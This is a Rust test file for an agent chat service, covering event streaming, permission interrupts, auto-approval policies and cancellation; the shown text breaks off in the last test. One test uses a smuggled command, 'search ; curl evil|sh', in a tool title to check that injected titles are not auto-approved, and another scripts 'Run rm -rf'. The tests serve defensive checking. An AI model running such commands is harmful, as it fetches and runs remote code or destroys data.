use crate::{
    agents::{AgentService, NewAgent},
    chat::{ChatError, ChatPorts, ChatService, RunEvents},
    error::PortError,
    ports::{
        AgentConnector, AgentDirectory, AgentEventSink, Background, McpAccess, PermissionDecision,
        PortResult, SessionOpened, TaskHandle,
    },
    services::AppService,
    testing::{Fakes, FixedClock, MemAgentStore, MemThreadStore, SeededRandom},
};
use async_trait::async_trait;
use futures_util::StreamExt;
use parking_lot::Mutex;
use serde_json::{json, Value};
use std::{collections::VecDeque, future::Future, pin::Pin, sync::Arc, time::Duration};
use tokio::sync::{oneshot, Notify};
use vos_domain::{
    agui::{AgUiEvent, RunAgentInput, RunOutcome},
    thread::{
        AgentEvent, ConfigChoice, ConfigOption, ConfigValue, ContextUsage, Mode, ModeState, PermissionAnswer,
        PermissionKind, PermissionOption, PermissionRequest, PlanEntry, PlanStatus, SessionState,
        SettingsChange, SlashCommand, StopReason, ThreadMessage, ToolKind, ToolStatus,
    },
    Agent, AgentId, AgentRuntime, AppId, ApprovalPolicy, Grants,
};

// ---- fakes --------------------------------------------------------------------------------------------

/// One step of what a scripted turn does.
enum Step {
    Event(AgentEvent),
    /// Raise a permission request and wait for the answer (unless the policy answers it).
    Ask(PermissionRequest),
    /// Wait until the turn is cancelled.
    UntilCancelled,
    Fail(&'static str),
}

#[derive(Default)]
struct ScriptedConnector {
    sink: Mutex<Option<Arc<dyn AgentEventSink>>>,
    turns: Mutex<VecDeque<Vec<Step>>>,
    waiting: Mutex<Vec<(String, oneshot::Sender<PermissionAnswer>)>>,
    answers: Mutex<Vec<(String, PermissionAnswer)>>,
    auto: Mutex<Vec<String>>,
    prompts: Mutex<Vec<String>>,
    cancels: Mutex<u32>,
    cancel: Notify,
    opened: Mutex<Vec<(String, Option<McpAccess>)>>,
    modes: Mutex<Vec<String>>,
    stopped: Mutex<u32>,
    fail_open: Mutex<bool>,
}

impl ScriptedConnector {
    fn script(&self, steps: Vec<Step>) {
        self.turns.lock().push_back(steps);
    }
    fn sink(&self) -> Arc<dyn AgentEventSink> {
        self.sink.lock().clone().unwrap()
    }
}

#[async_trait]
impl AgentConnector for ScriptedConnector {
    async fn open_session(
        &self,
        agent: &Agent,
        mcp: Option<McpAccess>,
        sink: Arc<dyn AgentEventSink>,
    ) -> PortResult<SessionOpened> {
        if *self.fail_open.lock() {
            return Err(PortError::Rejected("could not start `claude-agent-acp`".into()));
        }
        self.opened.lock().push((agent.id.0.clone(), mcp));
        *self.sink.lock() = Some(sink);
        Ok(SessionOpened {
            session_id: "sess-1".into(),
            session: SessionState {
                tools_connected: true,
                modes: Some(ModeState {
                    current: "default".into(),
                    available: vec![
                        Mode { id: "default".into(), name: "Default".into(), description: None },
                        Mode { id: "plan".into(), name: "Plan".into(), description: None },
                    ],
                }),
                config: vec![ConfigOption::Select {
                    id: "model".into(),
                    name: "Model".into(),
                    description: None,
                    category: Some("model".into()),
                    current: "opus".into(),
                    options: vec![
                        ConfigChoice { value: "opus".into(), name: "Opus".into(), description: None },
                        ConfigChoice { value: "sonnet".into(), name: "Sonnet".into(), description: None },
                    ],
                }],
                ..SessionState::default()
            },
        })
    }

    async fn prompt(&self, _agent: &AgentId, _session: &str, text: &str) -> PortResult<StopReason> {
        self.prompts.lock().push(text.to_owned());
        let steps = self.turns.lock().pop_front().unwrap_or_default();
        let sink = self.sink();
        for step in steps {
            match step {
                Step::Event(e) => sink.on_event(e),
                Step::Ask(request) => match sink.on_permission(&request) {
                    PermissionDecision::Auto(option) => self.auto.lock().push(option),
                    PermissionDecision::Ask => {
                        let (tx, rx) = oneshot::channel();
                        self.waiting.lock().push((request.request_id.clone(), tx));
                        let _ = rx.await;
                    }
                },
                Step::UntilCancelled => {
                    self.cancel.notified().await;
                    return Ok(StopReason::Cancelled);
                }
                Step::Fail(why) => return Err(PortError::Rejected(why.into())),
            }
        }
        Ok(StopReason::EndTurn)
    }

    async fn cancel(&self, _agent: &AgentId, _session: &str) -> PortResult<()> {
        *self.cancels.lock() += 1;
        self.cancel.notify_one();
        Ok(())
    }

    async fn answer_permission(&self, request_id: &str, answer: PermissionAnswer) {
        self.answers.lock().push((request_id.to_owned(), answer.clone()));
        let waiter = {
            let mut waiting = self.waiting.lock();
            waiting.iter().position(|(id, _)| id == request_id).map(|i| waiting.remove(i))
        };
        if let Some((_, tx)) = waiter {
            let _ = tx.send(answer);
        }
    }

    async fn set_mode(&self, _agent: &AgentId, _session: &str, mode: &str) -> PortResult<()> {
        self.modes.lock().push(mode.to_owned());
        Ok(())
    }

    async fn set_config(
        &self,
        _agent: &AgentId,
        _session: &str,
        id: &str,
        value: ConfigValue,
    ) -> PortResult<Vec<ConfigOption>> {
        let ConfigValue::Text(current) = value else {
            return Err(PortError::Rejected("not a switch".into()));
        };
        Ok(vec![ConfigOption::Select {
            id: id.into(),
            name: "Model".into(),
            description: None,
            category: Some("model".into()),
            current,
            options: vec![],
        }])
    }

    async fn close_session(&self, _agent: &AgentId, _session: &str) {}

    async fn stop_all(&self) {
        *self.stopped.lock() += 1;
    }
}

struct AbortOnDrop(tokio::task::JoinHandle<()>);
impl TaskHandle for AbortOnDrop {}
impl Drop for AbortOnDrop {
    fn drop(&mut self) {
        self.0.abort();
    }
}
struct TokioBackground;
impl Background for TokioBackground {
    fn spawn(
        &self,
        _name: &'static str,
        task: Pin<Box<dyn Future<Output = ()> + Send>>,
    ) -> Box<dyn TaskHandle> {
        Box::new(AbortOnDrop(tokio::spawn(task)))
    }
}

struct Rig {
    chat: Arc<ChatService>,
    agents: Arc<AgentService>,
    connector: Arc<ScriptedConnector>,
    threads: Arc<MemThreadStore>,
    apps: Arc<AppService>,
    fakes: Fakes,
}

async fn rig_with(approval: ApprovalPolicy) -> Rig {
    rig_granted(approval, Grants::default()).await
}

async fn rig_granted(approval: ApprovalPolicy, grants: Grants) -> Rig {
    let fakes = Fakes::new();
    let connector = Arc::new(ScriptedConnector::default());
    let threads = Arc::new(MemThreadStore::default());
    let agents = Arc::new(AgentService::new(
        Arc::new(MemAgentStore::default()),
        fakes.registry.clone(),
        Arc::new(SeededRandom::default()),
        Arc::new(crate::NoAgentProcesses),
    ));
    agents
        .create(NewAgent {
            id: Some("claude".into()),
            name: "Claude".into(),
            runtime: AgentRuntime { command: "claude-agent-acp".into(), ..AgentRuntime::default() },
            approval,
            grants,
            ..NewAgent::default()
        })
        .await
        .unwrap();
    let apps = Arc::new(fakes.service());
    let chat = ChatService::new(ChatPorts {
        connector: connector.clone(),
        threads: threads.clone(),
        background: Arc::new(TokioBackground),
        clock: Arc::new(FixedClock(1_763_457_120_000)),
        random: Arc::new(SeededRandom::default()),
        agents: agents.clone(),
        apps: apps.clone(),
        mcp_url: Some("http://127.0.0.1:7400/mcp".into()),
    });
    Rig { chat, agents, connector, threads, apps, fakes }
}

fn input(thread: &str, run: &str, text: &str) -> RunAgentInput {
    serde_json::from_value(json!({
        "threadId": thread, "runId": run,
        "messages": [{"id": format!("u-{run}"), "role": "user", "content": text}],
        "forwardedProps": {"agentId": "claude"},
    }))
    .unwrap()
}

fn resume(thread: &str, run: &str, interrupt: &str, status: &str, option: Option<&str>) -> RunAgentInput {
    let payload = option.map(|o| json!({"optionId": o}));
    serde_json::from_value(json!({
        "threadId": thread, "runId": run,
        "resume": [{"interruptId": interrupt, "status": status, "payload": payload}],
    }))
    .unwrap()
}

/// Read the stream to its end (the run ending closes it).
async fn collect(mut rx: RunEvents) -> Vec<AgUiEvent> {
    let mut out = Vec::new();
    while let Some(e) = tokio::time::timeout(Duration::from_secs(5), rx.next()).await.expect("run ends") {
        out.push(e);
    }
    out
}

fn types(events: &[AgUiEvent]) -> Vec<&'static str> {
    events
        .iter()
        .map(|e| match e {
            AgUiEvent::RunStarted { .. } => "RUN_STARTED",
            AgUiEvent::RunFinished { .. } => "RUN_FINISHED",
            AgUiEvent::RunError { .. } => "RUN_ERROR",
            AgUiEvent::TextMessageStart { .. } => "TEXT_START",
            AgUiEvent::TextMessageContent { .. } => "TEXT",
            AgUiEvent::TextMessageEnd { .. } => "TEXT_END",
            AgUiEvent::ReasoningStart { .. } => "REASONING_START",
            AgUiEvent::ReasoningMessageStart { .. } => "REASONING_MSG_START",
            AgUiEvent::ReasoningMessageContent { .. } => "REASONING",
            AgUiEvent::ReasoningMessageEnd { .. } => "REASONING_MSG_END",
            AgUiEvent::ReasoningEnd { .. } => "REASONING_END",
            AgUiEvent::ToolCallStart { .. } => "TOOL_START",
            AgUiEvent::ToolCallArgs { .. } => "TOOL_ARGS",
            AgUiEvent::ToolCallEnd { .. } => "TOOL_END",
            AgUiEvent::ToolCallResult { .. } => "TOOL_RESULT",
            AgUiEvent::StateSnapshot { .. } => "STATE_SNAPSHOT",
            AgUiEvent::StateDelta { .. } => "STATE_DELTA",
            AgUiEvent::Custom { .. } => "CUSTOM",
            AgUiEvent::StepStarted { .. } | AgUiEvent::StepFinished { .. } => "STEP",
        })
        .collect()
}

fn permission(title: &str) -> PermissionRequest {
    PermissionRequest {
        request_id: "perm-1".into(),
        tool_call_id: Some("tc-1".into()),
        title: title.into(),
        kind: Some(ToolKind::Read),
        options: vec![
            PermissionOption {
                option_id: "once".into(),
                name: "Allow once".into(),
                kind: PermissionKind::AllowOnce,
            },
            PermissionOption {
                option_id: "always".into(),
                name: "Always allow".into(),
                kind: PermissionKind::AllowAlways,
            },
            PermissionOption {
                option_id: "no".into(),
                name: "Deny".into(),
                kind: PermissionKind::RejectOnce,
            },
        ],
    }
}

fn chunk(s: &str) -> Step {
    Step::Event(AgentEvent::MessageChunk(s.into()))
}

// ---- tests --------------------------------------------------------------------------------------------

#[tokio::test]
async fn a_text_reply_streams_as_one_message_and_is_kept_in_the_transcript() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![chunk("Hello"), chunk(", world")]);
    let events = collect(r.chat.run(input("t1", "r1", "hi")).await.unwrap()).await;
    assert_eq!(
        types(&events),
        ["RUN_STARTED", "STATE_SNAPSHOT", "TEXT_START", "TEXT", "TEXT", "TEXT_END", "RUN_FINISHED"]
    );
    let AgUiEvent::RunStarted { thread_id, run_id, .. } = &events[0] else { panic!() };
    assert_eq!((thread_id.as_str(), run_id.as_str()), ("t1", "r1"));
    let AgUiEvent::StateSnapshot { snapshot } = &events[1] else { panic!() };
    assert_eq!(snapshot["session"]["modes"]["current"], "default");
    let AgUiEvent::RunFinished { outcome, result, .. } = events.last().unwrap() else { panic!() };
    assert_eq!(outcome, &Some(RunOutcome::Success));
    assert_eq!(result.as_ref().unwrap()["stopReason"], "end_turn");

    assert_eq!(r.connector.prompts.lock().as_slice(), ["hi"]);
    let snap = r.chat.snapshot("t1").await.unwrap();
    assert!(!snap.running);
    assert_eq!(snap.messages.len(), 2);
    assert!(matches!(&snap.messages[0], ThreadMessage::User { content, .. } if content == "hi"));
    assert!(
        matches!(&snap.messages[1], ThreadMessage::Assistant { content: Some(c), .. } if c == "Hello, world")
    );
    let stored = r.threads.get("t1").unwrap();
    assert_eq!(stored.messages, snap.messages, "the transcript is persisted when the turn ends");
}

#[tokio::test]
async fn the_session_gets_the_agents_own_mcp_token() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.chat.ensure("t1", "claude").await.unwrap();
    let opened = r.connector.opened.lock().clone();
    let mcp = opened[0].1.clone().unwrap();
    assert_eq!(mcp.url, "http://127.0.0.1:7400/mcp");
    let id = vos_application_directory(&r.agents, &mcp.token);
    assert_eq!(id, "Claude", "the launch token resolves to this agent");
    r.chat.ensure("t1", "claude").await.unwrap();
    assert_eq!(r.connector.opened.lock().len(), 1, "ensuring again does not open another session");
}

fn vos_application_directory(agents: &AgentService, token: &str) -> String {
    agents.authenticate(token).unwrap().name
}

#[tokio::test]
async fn reasoning_and_text_alternate_with_everything_closed_in_order() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![
        Step::Event(AgentEvent::ThoughtChunk("hm".into())),
        Step::Event(AgentEvent::ThoughtChunk("m".into())),
        chunk("Answer"),
    ]);
    let events = collect(r.chat.run(input("t1", "r1", "why")).await.unwrap()).await;
    assert_eq!(
        types(&events),
        [
            "RUN_STARTED",
            "STATE_SNAPSHOT",
            "REASONING_START",
            "REASONING_MSG_START",
            "REASONING",
            "REASONING",
            "REASONING_MSG_END",
            "REASONING_END",
            "TEXT_START",
            "TEXT",
            "TEXT_END",
            "RUN_FINISHED"
        ]
    );
    let snap = r.chat.snapshot("t1").await.unwrap();
    assert!(matches!(&snap.messages[1], ThreadMessage::Reasoning { content, .. } if content == "hmm"));
}

#[tokio::test]
async fn a_tool_call_streams_its_status_and_result_and_lands_in_the_transcript() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![
        Step::Event(AgentEvent::ToolCall {
            id: "tc-1".into(),
            title: "mcp__vos__notes__search".into(),
            kind: Some("search".into()),
            status: ToolStatus::Pending,
            raw_input: Some(json!({"query": "milk"})),
        }),
        Step::Event(AgentEvent::ToolUpdate {
            id: "tc-1".into(),
            title: None,
            kind: None,
            status: Some(ToolStatus::Completed),
            output: Some("2 notes".into()),
        }),
        Step::Event(AgentEvent::ToolCall {
            id: "tc-2".into(),
            title: "Edit file".into(),
            kind: Some("edit".into()),
            status: ToolStatus::InProgress,
            raw_input: None,
        }),
        Step::Event(AgentEvent::ToolUpdate {
            id: "tc-2".into(),
            title: None,
            kind: None,
            status: Some(ToolStatus::Failed),
            output: None,
        }),
        chunk("done"),
    ]);
    let events = collect(r.chat.run(input("t1", "r1", "find milk")).await.unwrap()).await;
    assert_eq!(
        types(&events),
        [
            "RUN_STARTED",
            "STATE_SNAPSHOT",
            "TOOL_START",
            "TOOL_ARGS",
            "TOOL_END",
            "CUSTOM",
            "CUSTOM",
            "TOOL_RESULT",
            "TOOL_START",
            "TOOL_END",
            "CUSTOM",
            "CUSTOM",
            "TEXT_START",
            "TEXT",
            "TEXT_END",
            "RUN_FINISHED"
        ]
    );
    let AgUiEvent::ToolCallStart { tool_call_name, .. } = &events[2] else { panic!() };
    assert_eq!(tool_call_name, "mcp__vos__notes__search");
    let AgUiEvent::ToolCallArgs { delta, .. } = &events[3] else { panic!() };
    assert_eq!(delta, r#"{"query":"milk"}"#);
    let AgUiEvent::Custom { name, value } = &events[6] else { panic!() };
    assert_eq!(name, "vos.tool");
    assert_eq!(value["status"], "completed");
    assert_eq!(value["kind"], "search");
    let AgUiEvent::Custom { value, .. } = &events[11] else { panic!() };
    assert_eq!(value["status"], "failed");
    let AgUiEvent::ToolCallResult { content, tool_call_id, .. } = &events[7] else { panic!() };
    assert_eq!((content.as_str(), tool_call_id.as_str()), ("2 notes", "tc-1"));

    let snap = r.chat.snapshot("t1").await.unwrap();
    let kinds: Vec<&str> = snap
        .messages
        .iter()
        .map(|m| match m {
            ThreadMessage::User { .. } => "user",
            ThreadMessage::Assistant { tool_calls, .. } if !tool_calls.is_empty() => "call",
            ThreadMessage::Assistant { .. } => "text",
            ThreadMessage::Tool { .. } => "tool",
            ThreadMessage::Reasoning { .. } => "reasoning",
            ThreadMessage::System { .. } => "system",
        })
        .collect();
    assert_eq!(kinds, ["user", "call", "tool", "call", "text"]);
    let ThreadMessage::Assistant { vos: Some(meta), .. } = &snap.messages[3] else { panic!() };
    assert_eq!(meta.status, ToolStatus::Failed);
}

#[tokio::test]
async fn state_changes_arrive_as_json_patches_and_are_kept_in_the_state() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![
        Step::Event(AgentEvent::Commands(vec![SlashCommand {
            name: "compact".into(),
            description: "Compact".into(),
            hint: None,
        }])),
        Step::Event(AgentEvent::Usage(ContextUsage { used: 5, size: 100, cost: None })),
        Step::Event(AgentEvent::Mode("plan".into())),
        Step::Event(AgentEvent::Plan(vec![PlanEntry {
            content: "step".into(),
            status: PlanStatus::InProgress,
            priority: "high".into(),
        }])),
        Step::Event(AgentEvent::Title("Milk".into())),
    ]);
    let events = collect(r.chat.run(input("t1", "r1", "go")).await.unwrap()).await;
    let deltas: Vec<&Vec<Value>> = events
        .iter()
        .filter_map(|e| if let AgUiEvent::StateDelta { delta } = e { Some(delta) } else { None })
        .collect();
    assert_eq!(deltas.len(), 5);
    assert_eq!(
        deltas[0][0],
        json!({"op": "replace", "path": "/session/commands", "value": [{"name": "compact", "description": "Compact"}]})
    );
    assert_eq!(deltas[1][0]["path"], "/session/usage");
    assert_eq!(deltas[2][0], json!({"op": "replace", "path": "/session/modes/current", "value": "plan"}));
    assert_eq!(deltas[3][0]["path"], "/plan");
    let state = r.chat.snapshot("t1").await.unwrap().state;
    assert_eq!(state.session.usage.unwrap().used, 5);
    assert_eq!(state.session.modes.unwrap().current, "plan");
    assert_eq!(state.session.title.as_deref(), Some("Milk"));
    assert_eq!(state.session.commands[0].name, "compact");
    assert_eq!(state.plan.unwrap()[0].content, "step");
}

#[tokio::test]
async fn a_permission_request_interrupts_the_run_and_a_resume_streams_the_rest_of_the_turn() {
    let r = rig_with(ApprovalPolicy::Ask).await;
    r.connector.script(vec![
        chunk("Let me check. "),
        Step::Ask(permission("mcp__vos__notes__append")),
        chunk("Appended."),
    ]);
    let first = collect(r.chat.run(input("t1", "r1", "append")).await.unwrap()).await;
    assert_eq!(
        types(&first),
        ["RUN_STARTED", "STATE_SNAPSHOT", "TEXT_START", "TEXT", "TEXT_END", "RUN_FINISHED"]
    );
    let AgUiEvent::RunFinished { outcome: Some(RunOutcome::Interrupt { interrupts }), .. } =
        first.last().unwrap()
    else {
        panic!("{:?}", first.last());
    };
    assert_eq!(interrupts.len(), 1);
    let i = &interrupts[0];
    assert_eq!(
        (i.id.as_str(), i.reason.as_str(), i.tool_call_id.as_deref()),
        ("perm-1", "tool_call", Some("tc-1"))
    );
    assert_eq!(i.expires_at.as_deref(), Some("2025-11-18T09:22:00.000Z"));
    assert_eq!(i.metadata.as_ref().unwrap()["vos:options"][1]["kind"], "allow_always");

    // still suspended: the thread is running and re-offers the interrupt after a "reload"
    let snap = r.chat.snapshot("t1").await.unwrap();
    assert!(snap.running);
    assert_eq!(snap.interrupts, *interrupts);

    // a new message while waiting is refused; so is an incomplete or unknown resume
    let blocked = collect(r.chat.run(input("t1", "r2", "again")).await.unwrap()).await;
    assert!(
        matches!(blocked.last(), Some(AgUiEvent::RunError { code: Some(c), .. }) if c == "interrupts_pending")
    );
    let unknown =
        collect(r.chat.run(resume("t1", "r2", "nope", "resolved", Some("once"))).await.unwrap()).await;
    assert!(
        matches!(unknown.last(), Some(AgUiEvent::RunError { code: Some(c), .. }) if c == "unknown_interrupt")
    );
    assert!(r.connector.answers.lock().is_empty(), "refused resumes answer nothing");

    let second =
        collect(r.chat.run(resume("t1", "r3", "perm-1", "resolved", Some("once"))).await.unwrap()).await;
    assert_eq!(
        types(&second),
        ["RUN_STARTED", "STATE_SNAPSHOT", "TEXT_START", "TEXT", "TEXT_END", "RUN_FINISHED"]
    );
    assert!(matches!(&second[0], AgUiEvent::RunStarted { run_id, .. } if run_id == "r3"));
    assert_eq!(
        r.connector.answers.lock().as_slice(),
        [("perm-1".to_owned(), PermissionAnswer::Selected("once".into()))]
    );
    let snap = r.chat.snapshot("t1").await.unwrap();
    assert!(!snap.running && snap.interrupts.is_empty());
    assert_eq!(snap.messages.len(), 3, "user, the text before the request, the text after");
}

#[tokio::test]
async fn denying_resolves_the_request_as_cancelled() {
    let r = rig_with(ApprovalPolicy::Ask).await;
    r.connector.script(vec![Step::Ask(permission("Edit file")), chunk("Understood.")]);
    collect(r.chat.run(input("t1", "r1", "edit")).await.unwrap()).await;
    let rest = collect(r.chat.run(resume("t1", "r2", "perm-1", "cancelled", None)).await.unwrap()).await;
    assert!(matches!(rest.last(), Some(AgUiEvent::RunFinished { outcome: Some(RunOutcome::Success), .. })));
    assert_eq!(r.connector.answers.lock()[0].1, PermissionAnswer::Cancelled);
}

#[tokio::test]
async fn a_read_only_vos_tool_runs_without_a_prompt_but_a_writing_one_asks() {
    let r = rig_granted(ApprovalPolicy::AutoReadOnly, Grants::apps([AppId::parse("notes").unwrap()])).await;
    // notes: `search` is readOnly, `append` is not
    let url = r.fakes.add_app("notes", &[("search?", "x"), ("append", "x")]);
    r.apps.install_from_url(&url).await.unwrap();

    r.connector.script(vec![Step::Ask(permission("mcp__vos__notes__search")), chunk("found")]);
    let events = collect(r.chat.run(input("t1", "r1", "search")).await.unwrap()).await;
    assert!(matches!(events.last(), Some(AgUiEvent::RunFinished { outcome: Some(RunOutcome::Success), .. })));
    assert_eq!(
        r.connector.auto.lock().as_slice(),
        ["once"],
        "answered on the agent's behalf, with allow-once"
    );

    r.connector.script(vec![Step::Ask(permission("mcp__vos__notes__append"))]);
    let events = collect(r.chat.run(input("t1", "r2", "append")).await.unwrap()).await;
    assert!(matches!(
        events.last(),
        Some(AgUiEvent::RunFinished { outcome: Some(RunOutcome::Interrupt { .. }), .. })
    ));
    assert_eq!(r.connector.auto.lock().len(), 1, "the writing tool was not auto-allowed");
    // a tool of something else entirely always asks under this policy
    r.chat.cancel("t1").await.unwrap();
}

/// Run one scripted permission request under `AutoReadOnly` and say whether the host answered it by itself.
async fn auto_approved(rig: &Rig, request: PermissionRequest) -> bool {
    static NEXT: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
    let before = rig.connector.auto.lock().len();
    rig.connector.script(vec![Step::Ask(request)]);
    // a thread of its own per request: the previous turn may still be winding down
    let n = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let thread = format!("auto-{n}");
    collect(rig.chat.run(input(&thread, "r1", "go")).await.unwrap()).await;
    let auto = rig.connector.auto.lock().len() > before;
    rig.chat.cancel(&thread).await.unwrap();
    auto
}

async fn notes_rig(grants: Grants) -> Rig {
    let r = rig_granted(ApprovalPolicy::AutoReadOnly, grants).await;
    let url = r.fakes.add_app("notes", &[("search?", "x"), ("append", "x")]);
    r.apps.install_from_url(&url).await.unwrap();
    r
}

#[tokio::test]
async fn auto_approval_needs_the_exact_title_of_a_granted_read_only_tool() {
    let granted = Grants::apps([AppId::parse("notes").unwrap()]);
    let r = notes_rig(granted.clone()).await;
    assert!(auto_approved(&r, permission("mcp__vos__notes__search")).await, "the exact title is allowed");
    for title in [
        "mcp__vos__notes__search ; curl evil|sh",
        "mcp__vos__notes__search extra words",
        "mcp__vos__notes__missing",
        "Run mcp__vos__notes__search",
    ] {
        assert!(!auto_approved(&r, permission(title)).await, "{title:?} must ask");
    }

    // an agent that is not granted the app is asked even for its readOnly tool
    let r = notes_rig(Grants::default()).await;
    assert!(!auto_approved(&r, permission("mcp__vos__notes__search")).await, "an ungranted tool asks");
    let r = notes_rig(Grants::allow_all()).await;
    assert!(auto_approved(&r, permission("mcp__vos__notes__search")).await, "all apps covers it");
}

#[tokio::test]
async fn only_a_read_only_kind_skips_the_prompt_for_a_read_only_title() {
    let r = notes_rig(Grants::apps([AppId::parse("notes").unwrap()])).await;
    for kind in [ToolKind::Read, ToolKind::Search, ToolKind::Fetch] {
        let request = PermissionRequest { kind: Some(kind), ..permission("mcp__vos__notes__search") };
        assert!(auto_approved(&r, request).await, "{kind:?} may be auto-approved");
    }
    for kind in [
        ToolKind::Execute,
        ToolKind::Edit,
        ToolKind::Delete,
        ToolKind::Move,
        ToolKind::Think,
        ToolKind::SwitchMode,
        ToolKind::Other,
        ToolKind::Unknown,
    ] {
        let request = PermissionRequest { kind: Some(kind), ..permission("mcp__vos__notes__search") };
        assert!(!auto_approved(&r, request).await, "{kind:?} must ask");
    }
    let undeclared = PermissionRequest { kind: None, ..permission("mcp__vos__notes__search") };
    assert!(!auto_approved(&r, undeclared).await, "a request that declares no kind must ask");
}

#[tokio::test]
async fn auto_read_only_never_picks_a_standing_allow() {
    let r = notes_rig(Grants::apps([AppId::parse("notes").unwrap()])).await;
    // an agent that only offers "always allow" (and a reject) is asked: a standing allow is the person's to give
    let mut request = permission("mcp__vos__notes__search");
    request.options.retain(|o| o.kind != PermissionKind::AllowOnce);
    assert!(request.options.iter().any(|o| o.kind == PermissionKind::AllowAlways));
    assert!(!auto_approved(&r, request).await, "only allow-once is picked on the agent's behalf");
    // and when both are offered, it is the once
    let both = permission("mcp__vos__notes__search");
    assert!(auto_approved(&r, both).await);
    assert_eq!(r.connector.auto.lock().last().map(String::as_str), Some("once"));
}

#[tokio::test]
async fn an_unknown_option_kind_is_never_auto_allowed() {
    let r = notes_rig(Grants::apps([AppId::parse("notes").unwrap()])).await;
    let mut request = permission("mcp__vos__notes__search");
    for option in &mut request.options {
        option.kind = PermissionKind::Unknown;
    }
    assert!(!auto_approved(&r, request).await, "with no allow option there is nothing to auto-select");
    let r = rig_with(ApprovalPolicy::AllowEverything).await;
    let mut request = permission("Run it");
    for option in &mut request.options {
        option.kind = PermissionKind::Unknown;
    }
    r.connector.script(vec![Step::Ask(request)]);
    collect(r.chat.run(input("t1", "r1", "go")).await.unwrap()).await;
    assert!(r.connector.auto.lock().is_empty(), "even allow-everything does not select an unknown kind");
    r.chat.cancel("t1").await.unwrap();
}

#[tokio::test]
async fn the_policies_ask_always_and_allow_all() {
    let r = rig_with(ApprovalPolicy::Ask).await;
    let url = r.fakes.add_app("notes", &[("search?", "x")]);
    r.apps.install_from_url(&url).await.unwrap();
    r.connector.script(vec![Step::Ask(permission("mcp__vos__notes__search"))]);
    let events = collect(r.chat.run(input("t1", "r1", "go")).await.unwrap()).await;
    assert!(
        matches!(
            events.last(),
            Some(AgUiEvent::RunFinished { outcome: Some(RunOutcome::Interrupt { .. }), .. })
        ),
        "ask always asks"
    );
    r.chat.cancel("t1").await.unwrap();

    let r = rig_with(ApprovalPolicy::AllowEverything).await;
    r.connector.script(vec![Step::Ask(permission("Run rm -rf")), chunk("ok")]);
    let events = collect(r.chat.run(input("t1", "r1", "go")).await.unwrap()).await;
    assert!(matches!(events.last(), Some(AgUiEvent::RunFinished { outcome: Some(RunOutcome::Success), .. })));
    assert_eq!(r.connector.auto.lock().as_slice(), ["once"]);
}

#[tokio::test]
async fn cancel_stops_the_turn_and_resolves_open_requests() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![chunk("working"), Step::UntilCancelled]);
    let rx = r.chat.run(input("t1", "r1", "long")).await.unwrap();
    // wait until the turn is under way, then cancel it
    tokio::time::timeout(Duration::from_secs(5), async {
        while r.connector.prompts.lock().is_empty() {
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
    })
    .await
    .unwrap();
    r.chat.cancel("t1").await.unwrap();
    let events = collect(rx).await;
    assert_eq!(*r.connector.cancels.lock(), 1);
    let AgUiEvent::RunFinished { result, .. } = events.last().unwrap() else { panic!() };
    assert_eq!(result.as_ref().unwrap()["stopReason"], "cancelled");

    // cancelling while suspended on a request answers it as cancelled
    let r = rig_with(ApprovalPolicy::Ask).await;
    r.connector.script(vec![Step::Ask(permission("Edit file"))]);
    collect(r.chat.run(input("t1", "r1", "edit")).await.unwrap()).await;
    r.chat.cancel("t1").await.unwrap();
    assert_eq!(r.connector.answers.lock()[0].1, PermissionAnswer::Cancelled);
    assert!(matches!(r.chat.cancel("ghost").await, Err(ChatError::NotFound(_))));
}

#[tokio::test]
async fn a_client_that_drops_the_stream_cancels_the_run_unless_it_is_waiting_for_an_answer() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![chunk("working"), Step::UntilCancelled]);
    let rx = r.chat.run(input("t1", "r1", "long")).await.unwrap();
    drop(rx);
    r.chat.client_gone("t1", "r1").await;
    assert_eq!(*r.connector.cancels.lock(), 1, "an abort is a cancel");

    let r = rig_with(ApprovalPolicy::Ask).await;
    r.connector.script(vec![Step::Ask(permission("Edit file")), chunk("later")]);
    let rx = r.chat.run(input("t1", "r1", "edit")).await.unwrap();
    let events = collect(rx).await;
    assert!(matches!(
        events.last(),
        Some(AgUiEvent::RunFinished { outcome: Some(RunOutcome::Interrupt { .. }), .. })
    ));
    r.chat.client_gone("t1", "r1").await;
    assert_eq!(*r.connector.cancels.lock(), 0, "the interrupted run's stream ending is not an abort");
    assert!(r.chat.snapshot("t1").await.unwrap().running);
}

#[tokio::test]
async fn failures_become_run_errors_and_stay_in_the_transcript() {
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![Step::Fail("the model is overloaded")]);
    let events = collect(r.chat.run(input("t1", "r1", "go")).await.unwrap()).await;
    let AgUiEvent::RunError { message, code } = events.last().unwrap() else { panic!() };
    assert!(message.contains("overloaded"));
    assert_eq!(code.as_deref(), Some("prompt_failed"));
    let snap = r.chat.snapshot("t1").await.unwrap();
    assert!(!snap.running);
    assert!(matches!(snap.messages.last(), Some(ThreadMessage::System { vos: Some(m), .. }) if m.error));

    // the agent process going away mid-turn
    let r = rig_with(ApprovalPolicy::default()).await;
    r.connector.script(vec![chunk("hm"), Step::UntilCancelled]);
    let rx = r.chat.run(input("t1", "r1", "go")).await.unwrap();
    tokio::time::timeout(Duration::from_secs(5), async {
        while r.connector.sink.lock().is_none() {
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
    })
    .await
    .unwrap();
    tokio::time::sleep(Duration::from_millis(30)).await;
    r.connector.sink().on_exit("agent exited (code 1)".into());
    let events = collect(rx).await;
    assert!(matches!(events.last(), Some(AgUiEvent::RunError { code: Some(c), .. }) if c == "agent_exited"));
    assert!(!r.chat.snapshot("t1").await.unwrap().running);
    // the next message opens a fresh session
    r.connector.script(vec![chunk("back")]);
    collect(r.chat.run(input("t1", "r2", "again")).await.unwrap()).await;
    assert_eq!(r.connector.opened.lock().len(), 2);
}

#[tokio::test]
async fn bad_requests_are_refused_before_a_stream_starts() {
    let r = rig_with(ApprovalPolicy::default()).await;
    // unknown agent, unknown thread without an agent, no user message, a thread of another agent
